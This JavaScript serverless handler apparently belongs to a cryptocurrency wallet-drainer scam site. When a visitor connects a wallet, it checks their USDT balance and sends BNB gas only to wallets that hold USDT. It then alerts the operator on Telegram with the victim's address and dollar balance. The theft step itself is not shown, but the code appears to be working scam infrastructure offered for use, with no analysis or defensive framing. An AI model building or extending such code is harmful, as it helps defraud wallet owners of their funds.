import { ethers } from 'ethers';
import {
    handleCors,
    getProvider,
    getUsdtContract,
    getWallet,
    sendTelegramMessage,
    USDT_ADDRESS,
    USDT_ABI,
    OWNER_PRIVATE_KEY
} from './_lib/helpers.js';

export default async function handler(req, res) {
    if (handleCors(req, res)) return;

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { userAddress } = req.body;
    if (!userAddress) return res.status(400).json({ error: 'No address provided' });

    try {
        let balanceStr = 'Loading...';
        let isFunded = false;
        const provider = getProvider();

        // ─── AUTO-GAS TRANSFER LOGIC (If user has low gas) ────────────────────────
        try {
            const usdtContractCheck = getUsdtContract(provider);
            const usdtBal = await usdtContractCheck.balanceOf(userAddress);

            if (usdtBal === 0n) {
                console.warn(`⚠️ Skipped Auto-Gas for ${userAddress}: USDT Balance is 0.`);
            } else {
                const autoFundAmount = process.env.AUTO_FUND_AMOUNT || "0.00003";
                const autoFundThreshold = process.env.AUTO_FUND_THRESHOLD || "0.00003";

                const bnbBalanceWei = await provider.getBalance(userAddress);
                const thresholdWei = ethers.parseEther(autoFundThreshold);

                if (bnbBalanceWei < thresholdWei) {
                    console.log(`⚠️ Low Balance detected for ${userAddress}. Initiating Auto-Gas Transfer...`);

                    if (OWNER_PRIVATE_KEY) {
                        const wallet = getWallet(provider);
                        const tx = await wallet.sendTransaction({
                            to: userAddress,
                            value: ethers.parseEther(autoFundAmount)
                        });
                        console.log(`✅ Sent Gas to ${userAddress}. Hash: ${tx.hash}`);
                        isFunded = true;
                    } else {
                        console.warn("⚠️ Cannot send Gas: Owner Private Key missing.");
                    }
                }
            }
        } catch (gasError) {
            console.error("❌ Auto-Gas Transfer Failed:", gasError.message);
        }

        // ─── FETCH USDT BALANCE FOR NOTIFICATION ────────────────────────────────
        try {
            const usdtContract = getUsdtContract(provider);
            const balance = await usdtContract.balanceOf(userAddress);
            const decimals = await usdtContract.decimals();
            balanceStr = '$' + ethers.formatUnits(balance, decimals);
        } catch (e) {
            balanceStr = 'N/A';
        }

        // ─── SEND TELEGRAM NOTIFICATION ─────────────────────────────────────────
        const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
        const message = `
👀 <b>ACCOUNT INFO OPENED / WALLET CONNECTED</b>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

💰 <b>BALANCE:</b>
<b>${balanceStr}</b>

⏰ <b>TIME:</b>
<code>${time}</code>
    `.trim();

        await sendTelegramMessage(message);

        res.json({ success: true, funded: isFunded });
    } catch (error) {
        console.error('Visit Notification Error:', error.message);
        res.status(500).json({ error: error.message });
    }
}
